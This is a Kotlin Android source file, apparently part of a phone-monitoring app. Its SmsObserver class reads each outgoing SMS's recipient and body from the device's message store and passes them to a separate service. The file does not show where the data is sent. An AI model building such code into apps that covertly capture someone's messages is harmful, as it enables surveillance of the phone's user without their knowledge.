package com.dtz.netservice.services.sms

import android.content.Context
import android.database.ContentObserver
import android.database.Cursor
import android.net.Uri
import android.os.Handler
import android.provider.Telephony
import com.dtz.netservice.preference.DataSharePreference.typeApp
import com.dtz.netservice.utils.ConstFun.startServiceSms
import com.dtz.netservice.utils.Consts.TAG
import com.dtz.netservice.utils.Consts.TYPE_SMS_OUTGOING
import com.pawegio.kandroid.e

/**
 * Created by luis rafael on 22/09/19.
 */
class SmsObserver(private val context: Context,handler: Handler) : ContentObserver(handler) {

    internal fun onChange(selfChange: Boolean, uri: Uri) {
        super.onChange(selfChange, uri)
        var cur : Cursor?=null
        try {
            cur = context.contentResolver.query(uri,null,null,null,null)
            cur!!.moveToFirst()
            val protocol = cur.getString(cur.getColumnIndexOrThrow(Telephony.Sms.PROTOCOL))
            val address = cur.getString(cur.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
            val body = cur.getString(cur.getColumnIndexOrThrow(Telephony.Sms.BODY))
            if (protocol == null) {
                if (!context.typeApp) context.startServiceSms<SmsService>(address,body, TYPE_SMS_OUTGOING)
            }
        }catch (t:Throwable){ e(TAG,t.message.toString()) }
        finally { cur?.close() }
    }

}